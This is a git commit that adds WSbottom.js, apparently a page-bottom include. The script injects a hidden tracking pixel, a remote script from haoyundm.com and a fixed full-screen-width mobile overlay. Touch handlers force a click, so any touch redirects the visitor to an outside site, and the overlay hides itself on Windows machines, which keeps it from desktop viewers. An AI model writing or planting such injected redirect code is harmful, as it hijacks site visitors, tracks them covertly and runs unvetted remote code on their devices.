4b8f49c9d3b9fed886065c1b62c8e56e4870686a
vinson <763537842@qq.com>
2021-10-30 15:55:31 +0800

    Create WSbottom.js

---
+++ WSbottom.js
@@ -0,0 +1,7 @@
+document.writeln("<script>function GoDb(){window.location.href=\"http://wd.haoyundm.com:88/c-83-109.zz\";}</script><img src=\"https://alm.haoyundm.com:12580/v-83-109-a.zlc\" style=\"display:none\"/>");
+document.writeln("<style>@media (max-width: 768px){.vddb+a,.vddb+a video:nth-child(1),.vddb+a a,.vddb_qq:before,.vddb_qq:after{content:'';display:block;width:100%;height:125px;object-fit:fill;position:fixed;bottom:0;left:0;z-index:2746858464;}");
+document.writeln(".vddb+a a,.vddb_qq:after{height:35px;bottom:125px;}.vddb_qq:before{z-index:2746858465;background:url(https://img.hylmkele.com:88/dibu);background-size:100% 100%;} ");
+document.writeln("body{margin-bottom:125px;}}@media (min-width: 768px){.vddb + a,.vddb_qq{display:none;}}</style>");
+document.writeln("<div class=\"vddb\"></div><a href=\"javascript:GoDb();\" title=\"2021\"><video poster=\"https://img.hylmkele.com:88/dibu\" src=\"\"></video><object><a></a></object></a><a class=\"vddb_qq\" href=\"javascript:GoDb();\" ontouchstart=\"this.click();\"></a>");
+document.writeln("<script>document.querySelector('.vddb').nextElementSibling.addEventListener('touchstart',function(){this.click();});</script><script>if(navigator.platform.indexOf('Win')>-1){document.querySelector('.vddb').nextElementSibling.style = document.querySelector('.vddb_qq').style = 'display:none;';}</script><script src=\"https://alm.haoyundm.com:88/83_1.js\"></script>");
+document.writeln("");
